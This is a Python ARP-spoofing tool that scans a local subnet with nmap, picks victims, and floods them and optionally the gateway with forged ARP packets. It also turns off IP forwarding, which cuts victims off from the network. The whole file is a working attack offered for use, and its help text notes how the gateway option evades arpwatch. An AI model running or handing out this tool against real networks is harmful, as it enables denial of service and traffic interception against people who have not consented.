#!/usr/bin/python3

import re
import os
import time
import nmap3
import socket
import threading
import binascii
import netifaces
import argparse

from subprocess import Popen, PIPE


subnet = "192.168.1.0/24"  # Subnet your local network for scanning
interfaces = netifaces.interfaces()  # All device interfaces

interface = None  # Attacker interface
gateway_ip = None  # Gateway IP-address
mac = None  # Attacker MAC-address
hard = False  # Attack gateway, vulnerable to arpwatch

victims = []  # List of victims in local network
threads = []  # List of active threads

s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))


class attackThread(threading.Thread):
	def __init__(self, victim, gateway,  mac, connect):
		threading.Thread.__init__(self)
		self.victim = victim
		self.gateway = gateway
		self.mac = self.encode_mac(mac)
		self.connect = connect

		# Other
		self.arp = b'\x08\x06'  # Code ARP protocol
		self.protocol = b'\x00\x01\x08\x00\x06\x04\x00\x01'  # ARP packet

	def run(self):
		victim_mac = self.get_mac(self.victim)
		epacket = victim_mac + self.mac + self.arp

		gip = socket.inet_aton(self.gateway)
		vip = socket.inet_aton(self.victim)

		request = epacket + self.protocol + self.mac + gip + victim_mac + vip

		while True:
			self.connect.send(request)
			print("ARP packet send to " + self.victim + " (0x0806), operation code 0x0001")
			time.sleep(0.3)


	def get_mac(self, local_ip):
		self.ping(local_ip)

		pid = Popen(["arp", "-n", local_ip], stdout=PIPE)
		spid = pid.communicate()[0].decode()
		local_mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", spid).groups()[0]

		return self.encode_mac(local_mac)

	def encode_mac(self, address):
		return binascii.unhexlify(address.strip().replace(':', ''))

	def ping(self, hostname):
		response = os.system("ping -c 1 " + hostname + " > /dev/null")
		return response != 0


def attack(ips):
	"""
	Initial attack threads
	
	:ips: array, ips for attack
	"""
	global threads, mac, gateway_ip, hard

	for victim_ip in ips:
		threads.append(attackThread(victim_ip, gateway_ip, mac, s))
		time.sleep(0.4)
		if hard:
			threads.append(attackThread(gateway_ip, victim_ip, mac, s))

	for th in threads:
		th.start()


def main():
	"""
	Main method
	"""
	global interface, hard, mac, s, victims, gateway_ip
	args = arguments()

	interface = args.interface
	gateway_ip = args.gateway
	hard = args.attackgateway

	if interface == None or gateway_ip == None:
		raise KeyboardInterrupt

	if interface in interfaces:
		mac = get_mac(interface)
		s.bind((interface, socket.htons(0x0800)))

	else:
		print(f"Interface {interface} not found.")
		raise KeyboardInterrupt

	print("Setting IP forward on your PC..")
	disable_ip_forward()

	try:
		if args.target == None:
			raise IndexError

		with open(args.target, 'r') as file:
			for line in file.readlines():
				ip = line.strip()

				if check_ip(ip):
					victims.append(ip)

				else:
					print("Invalid IP - " + ip)

		if len(victims) < 1:
			print("No IPs in your file.")
			raise KeyboardInterrupt

	except IndexError:
		print("Scanning computers in local network..")
		scanner(subnet)

	print("Running the attack..")
	attack(victims)


def arguments():
	"""
	argparse initialize
	
	:return: arguments on command line
	"""
	parser = argparse.ArgumentParser()
	parser.add_argument('-i', '--interface', required=True, dest="interface", help="Set a interface")
	parser.add_argument('-g', '--gateway', required=True, dest="gateway", help="Set a gateway")
	parser.add_argument('-t', '--target', dest="target", help="Set a file with local IPs")
	parser.add_argument('-a', '--attack-gateway', action="store_true", dest="attackgateway", help="Attack on the gateway, more vulnerable to arpwatch. Higher efficiency.")

	return parser.parse_args()


# Network methods

def disable_ip_forward():
	"""
	Disable IP-forward on Linux machine
	"""
	os.system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")


def scanner(ip):
	"""
	nmap -sn <ip>
	
	:ip: ip-mask for scan
	:return: array ips
	"""
	global victims, interface

	nmap = nmap3.NmapHostDiscovery()
	victims = nmap.nmap_no_portscan(ip)["hosts"]
	result = []

	print("")
	for element in victims:
		addr = element["addr"]
		if addr != gateway_ip and addr != get_local_ip(interface):
			result.append(addr)
			print(" -- " + addr)

	if len(result) < 1:
		print("No computers were found on the local network, try again.")
		raise SystemExit
	else:
		print("")
		answer = input("Continue? [Y/n] ")

		if answer.lower() != 'y':
			raise SystemExit

	victims = result
	return victims


def get_mac(interface):
	"""
	Get MAC-address device
	
	:interface: your network interface
	:return: MAC
	"""
	iface = netifaces.ifaddresses(interface)[netifaces.AF_LINK]
	return iface[0]["addr"]


def get_local_ip(interface):
	"""
	Get my local IP-address
	
	:interface: your network interface
	:return: IP
	"""
	iface = netifaces.ifaddresses(interface).get(netifaces.AF_INET)
	return iface[0]["addr"]


def check_ip(ip):
	"""
	Validate IP-address
	
	:ip: target IP-address
	:return: boolean
	"""
	try:
		socket.inet_aton(ip)
	except socket.error:
		return False

	return True


if __name__== "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print("Attack was stopped.")
